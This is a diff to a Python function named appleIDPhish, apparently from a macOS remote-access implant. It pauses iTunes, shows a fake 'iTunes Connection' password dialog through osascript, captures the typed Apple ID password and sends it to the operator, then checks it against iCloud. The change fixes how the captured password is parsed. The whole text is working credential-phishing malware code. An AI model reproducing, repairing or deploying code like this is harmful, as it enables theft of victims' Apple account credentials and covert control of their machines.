@@ -264,7 +264,7 @@ def appleIDPhish(username, GUIUser):
 		if isinstance(check, str): #we have file...
 			send_msg("%sApple password already found [%s] %s\n" % (blue_star, check, blue_star), False)
 			break
-		osa = "launchctl asuser " + str(bella_UID) + " osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"'"
+		osa = "launchctl asuser " + str(bella_UID) + " osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"' -e 'text returned of result'"
 		#pauses music, then prompts user
 		out = check_output(osa)
 		if not out[0]:
@@ -273,8 +273,7 @@ def appleIDPhish(username, GUIUser):
 			continue
 		else:
 			out = out[1]
-			passw = out.split()[3]
-			passw = passw.split(':')[1]
+			passw = out.replace('\n', '')
 			send_msg("%sUser has attempted to use password: %s\n" % (blue_star, passw), False)
 			try:
 				request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
